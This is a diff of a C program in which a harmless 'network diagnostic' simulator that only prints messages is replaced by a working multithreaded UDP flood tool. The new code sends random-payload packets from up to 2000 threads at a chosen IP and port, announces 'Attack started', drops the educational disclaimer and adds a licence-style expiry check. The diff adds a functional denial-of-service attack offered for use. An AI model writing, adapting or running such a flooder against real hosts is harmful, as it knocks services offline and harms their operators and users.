@@ -1,164 +1,141 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
 #include <pthread.h>
+#include <unistd.h>
 #include <time.h>
-#include <sys/socket.h>
+#include <signal.h>
+#include <string.h>
+#include <fcntl.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define MAX_THREADS 10000
-#define PACKET_SIZE 489
-#define AUTHOR "Ritik"
+#define MAX_THREADS 2000
+#define MIN_PACKET_SIZE 516
+#define MAX_PACKET_SIZE 1024
+#define EXPIRATION_YEAR 2028
+#define EXPIRATION_MONTH 4
+#define EXPIRATION_DAY 15
+
+int keep_running = 1;
 
 typedef struct {
-    int thread_id;
-    char* target_ip;
-    int port;
+    int socket_fd;
+    char *target_ip;
+    int target_port;
     int duration;
-    int packet_count;
-} thread_data_t;
+} attack_params;
 
-// Function prototypes
-void display_banner();
-void show_usage(char* program_name);
-void* network_diagnostic_thread(void* threadarg);
-void simulate_ping_test(const char* ip, int port, int thread_id);
-int isValidIP(const char* ip);
-
-// Banner display
-void display_banner() {
-    printf("===============================================\n");
-    printf("        Ritik's Network Diagnostic Tool\n");
-    printf("===============================================\n");
-    printf("Author: %s\n", AUTHOR);
-    printf("Purpose: Educational network testing tool\n");
-    printf("Warning: For authorized testing only\n");
-    printf("===============================================\n\n");
+void handle_signal(int sig) {
+    keep_running = 0;
 }
 
-// Show usage information
-void show_usage(char* program_name) {
-    printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", program_name);
-    printf("Example: %s 192.168.1.1 80 10 5\n\n", program_name);
-    printf("Parameters:\n");
-    printf("  IP        - Target IP address\n");
-    printf("  PORT      - Port number (1-65535)\n");
-    printf("  DURATION  - Test duration in seconds\n");
-    printf("  THREADS   - Number of threads (1-%d)\n\n", MAX_THREADS);
-}
+void *udp_flood(void *args) {
+    attack_params *params = (attack_params *)args;
+    struct sockaddr_in target;
+    char buffer[MAX_PACKET_SIZE];
+    unsigned int seed = time(NULL) ^ pthread_self();
+    time_t end_time = time(NULL) + params->duration;
 
-// Validate IP address format
-int isValidIP(const char* ip) {
-    struct sockaddr_in sa;
-    return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
-}
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(params->target_port);
+    inet_pton(AF_INET, params->target_ip, &target.sin_addr);
 
-// Simulate network diagnostic
-void simulate_ping_test(const char* ip, int port, int thread_id) {
-    const char* actions[] = {
-        "Testing network latency",
-        "Checking packet loss",
-        "Measuring jitter",
-        "Analyzing route",
-        "Testing bandwidth"
-    };
-    
-    int action_count = sizeof(actions) / sizeof(actions[0]);
-    int action_index = rand() % action_count;
-    
-    printf("[Thread %d] %s to %s:%d\n", 
-           thread_id, actions[action_index], ip, port);
-}
-
-// Thread function for network diagnostics
-void* network_diagnostic_thread(void* threadarg) {
-    thread_data_t* data = (thread_data_t*) threadarg;
-    time_t start_time = time(NULL);
-    
-    printf("[Thread %d] Starting diagnostic on %s:%d for %d seconds\n",
-           data->thread_id, data->target_ip, data->port, data->duration);
-    
-    while(time(NULL) - start_time < data->duration) {
-        simulate_ping_test(data->target_ip, data->port, data->thread_id);
-        sleep(1 + (rand() % 2));
-    }
-    
-    printf("[Thread %d] Diagnostic completed for %s:%d\n",
-           data->thread_id, data->target_ip, data->port);
-    
-    pthread_exit(NULL);
-}
-
-int main(int argc, char* argv[]) {
-    if (argc != 5) {
-        show_usage(argv[0]);
-        return 1;
-    }
-    
-    display_banner();
-    
-    // Parse arguments
-    char* target_ip = argv[1];
-    int port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int num_threads = atoi(argv[4]);
-    
-    // Validate inputs
-    if (!isValidIP(target_ip)) {
-        printf("Error: Invalid IP address format\n");
-        return 1;
-    }
-    
-    if (port < 1 || port > 65535) {
-        printf("Error: Port must be between 1-65535\n");
-        return 1;
-    }
-    
-    if (duration <= 0) {
-        printf("Error: Duration must be positive\n");
-        return 1;
-    }
-    
-    if (num_threads <= 0 || num_threads > MAX_THREADS) {
-        printf("Error: Threads must be between 1-%d\n", MAX_THREADS);
-        return 1;
-    }
-    
-    printf("Starting network diagnostic with parameters:\n");
-    printf("  Target: %s:%d\n", target_ip, port);
-    printf("  Duration: %d seconds\n", duration);
-    printf("  Threads: %d\n\n", num_threads);
-    
-    // Initialize random seed
-    srand(time(NULL));
-    
-    // Create threads
-    pthread_t threads[MAX_THREADS];
-    thread_data_t thread_data[MAX_THREADS];
-    
-    for (int i = 0; i < num_threads; i++) {
-        thread_data[i].thread_id = i;
-        thread_data[i].target_ip = target_ip;
-        thread_data[i].port = port;
-        thread_data[i].duration = duration;
-        thread_data[i].packet_count = 0;
-        
-        if (pthread_create(&threads[i], NULL, network_diagnostic_thread, (void*)&thread_data[i])) {
-            printf("Error creating thread %d\n", i);
-            return 1;
+    while (keep_running && time(NULL) < end_time) {
+        int packet_size = MIN_PACKET_SIZE + rand_r(&seed) % (MAX_PACKET_SIZE - MIN_PACKET_SIZE + 1);
+        for (int i = 0; i < packet_size; i++) {
+            buffer[i] = rand_r(&seed) % 256;
         }
+
+        sendto(params->socket_fd, buffer, packet_size, MSG_DONTWAIT,
+               (struct sockaddr *)&target, sizeof(target));
     }
-    
-    // Wait for all threads to complete
-    for (int i = 0; i < num_threads; i++) {
+
+    close(params->socket_fd);
+    return NULL;
+}
+
+int bind_random_source_port() {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return -1;
+
+    struct sockaddr_in src_addr;
+    memset(&src_addr, 0, sizeof(src_addr));
+    src_addr.sin_family = AF_INET;
+    src_addr.sin_addr.s_addr = INADDR_ANY;
+    src_addr.sin_port = htons((rand() % 64511) + 1024); // Random port 1024–65535
+
+    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+
+    fcntl(sock, F_SETFL, O_NONBLOCK);
+    return sock;
+}
+
+int main(int argc, char *argv[]) {
+    time_t now = time(NULL);
+    struct tm expiry_tm = {0};
+    expiry_tm.tm_year = EXPIRATION_YEAR - 1900;
+    expiry_tm.tm_mon = EXPIRATION_MONTH - 1;
+    expiry_tm.tm_mday = EXPIRATION_DAY;
+    time_t expiry_time = mktime(&expiry_tm);
+
+    if (difftime(now, expiry_time) > 0) {
+        printf("This binary has expired. Contact the author for an updated version.\n");
+        return EXIT_FAILURE;
+    }
+
+    if (argc < 5) {
+        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char *target_ip = argv[1];
+    int target_port = atoi(argv[2]);
+    int duration = atoi(argv[3]);
+    int thread_count = atoi(argv[4]);
+
+    if (thread_count > MAX_THREADS) {
+        thread_count = MAX_THREADS;
+    }
+
+    signal(SIGINT, handle_signal);
+    srand(time(NULL));
+
+    pthread_t threads[MAX_THREADS];
+    attack_params params[MAX_THREADS];
+
+    printf("Attack started on %s:%d for %d seconds using %d threads.\n",
+           target_ip, target_port, duration, thread_count);
+
+    for (int i = 0; i < thread_count; i++) {
+        int sock;
+        int retries = 10;
+        while ((sock = bind_random_source_port()) < 0 && retries--) {
+            usleep(1000); // retry bind
+        }
+
+        if (sock < 0) {
+            perror("Failed to bind random source port");
+            continue;
+        }
+
+        params[i] = (attack_params){
+            .target_ip = target_ip,
+            .target_port = target_port,
+            .duration = duration,
+            .socket_fd = sock
+        };
+
+        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
+    }
+
+    for (int i = 0; i < thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
-    
-    printf("\nNetwork diagnostic completed successfully.\n");
-    printf("This tool is for educational purposes only.\n");
-    printf("Always ensure you have permission before testing any network.\n");
-    
-    return 0;
+
+    printf("Attack finished.\n");
+    return EXIT_SUCCESS;
 }
